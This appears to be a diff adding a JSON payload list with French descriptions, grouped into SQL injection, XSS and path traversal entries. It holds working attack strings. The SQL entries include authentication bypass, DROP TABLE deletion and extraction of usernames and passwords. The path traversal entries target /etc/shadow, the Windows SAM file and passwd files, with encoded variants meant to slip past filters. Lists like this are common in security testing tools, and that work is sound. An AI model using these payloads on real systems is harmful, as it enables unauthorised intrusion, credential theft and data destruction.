@@ -1,0 +1,158 @@
+{
+  "sql_injection": [
+    {
+      "payload": "' OR '1'='1",
+      "type": "boolean-based",
+      "description": "Contournement authentification"
+    },
+    {
+      "payload": "admin'--",
+      "type": "comment",
+      "description": "Commentaire SQL"
+    },
+    {
+      "payload": "' UNION SELECT 1,2,3,4--",
+      "type": "union-based",
+      "description": "Test nombre de colonnes"
+    },
+    {
+      "payload": "'; DROP TABLE users;--",
+      "type": "destructive",
+      "description": "Suppression de table"
+    },
+    {
+      "payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+      "type": "boolean-based",
+      "description": "\u00c9num\u00e9ration sch\u00e9ma base"
+    },
+    {
+      "payload": "' OR SLEEP(5)--",
+      "type": "time-based",
+      "description": "D\u00e9lai temporel MySQL"
+    },
+    {
+      "payload": "' UNION SELECT username,password FROM users--",
+      "type": "union-based",
+      "description": "Extraction donn\u00e9es utilisateurs"
+    },
+    {
+      "payload": "' AND 1=CONVERT(int, (SELECT @@version))--",
+      "type": "error-based",
+      "description": "Version base via erreur"
+    },
+    {
+      "payload": "' OR 1=1; WAITFOR DELAY '00:00:05'--",
+      "type": "time-based",
+      "description": "D\u00e9lai temporel SQL Server"
+    },
+    {
+      "payload": "' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--",
+      "type": "boolean-based",
+      "description": "Extraction caract\u00e8re par caract\u00e8re"
+    }
+  ],
+  "xss": [
+    {
+      "payload": "<script>alert('XSS')</script>",
+      "type": "basic",
+      "description": "Alert box classique"
+    },
+    {
+      "payload": "<img src=x onerror=alert(1)>",
+      "type": "img-onerror",
+      "description": "Image avec onerror"
+    },
+    {
+      "payload": "javascript:alert('XSS')",
+      "type": "javascript-protocol",
+      "description": "Protocole JavaScript"
+    },
+    {
+      "payload": "<svg onload=alert(1)>",
+      "type": "svg-onload",
+      "description": "SVG avec \u00e9v\u00e9nement onload"
+    },
+    {
+      "payload": "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
+      "type": "attribute-escape",
+      "description": "\u00c9chappement d'attribut avec encodage"
+    },
+    {
+      "payload": "<iframe src=\"javascript:alert('XSS')\"></iframe>",
+      "type": "iframe-javascript",
+      "description": "IFrame avec JavaScript"
+    },
+    {
+      "payload": "<body onload=alert('XSS')>",
+      "type": "body-onload",
+      "description": "Body avec \u00e9v\u00e9nement onload"
+    },
+    {
+      "payload": "<input type=\"image\" src=\"x\" onerror=\"alert('XSS')\">",
+      "type": "input-onerror",
+      "description": "Input image avec onerror"
+    },
+    {
+      "payload": "<details open ontoggle=alert('XSS')>",
+      "type": "details-ontoggle",
+      "description": "Details avec \u00e9v\u00e9nement ontoggle"
+    },
+    {
+      "payload": "<style>@import'javascript:alert(\"XSS\")';</style>",
+      "type": "css-import",
+      "description": "Import CSS avec JavaScript"
+    }
+  ],
+  "path_traversal": [
+    {
+      "payload": "../../../etc/passwd",
+      "type": "linux",
+      "description": "Fichier passwd Linux"
+    },
+    {
+      "payload": "..\\..\\..\\windows\\system32\\config\\sam",
+      "type": "windows",
+      "description": "SAM Windows"
+    },
+    {
+      "payload": "../../../etc/shadow",
+      "type": "linux",
+      "description": "Fichier shadow Linux"
+    },
+    {
+      "payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "type": "windows",
+      "description": "Fichier hosts Windows"
+    },
+    {
+      "payload": "../../../private/etc/master.passwd",
+      "type": "mac",
+      "description": "Master passwd macOS"
+    },
+    {
+      "payload": "....//....//....//etc/passwd",
+      "type": "linux",
+      "description": "Bypass avec double dots"
+    },
+    {
+      "payload": "..%2f..%2f..%2fetc%2fpasswd",
+      "type": "linux",
+      "description": "URL encoded Linux"
+    },
+    {
+      "payload": "..\\..\\..\\boot.ini",
+      "type": "windows",
+      "description": "Boot.ini Windows"
+    },
+    {
+      "payload": "../../../Applications/",
+      "type": "mac",
+      "description": "R\u00e9pertoire Applications macOS"
+    },
+    {
+      "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fwin.ini",
+      "type": "windows",
+      "description": "Win.ini double encoded"
+    }
+  ]
+}
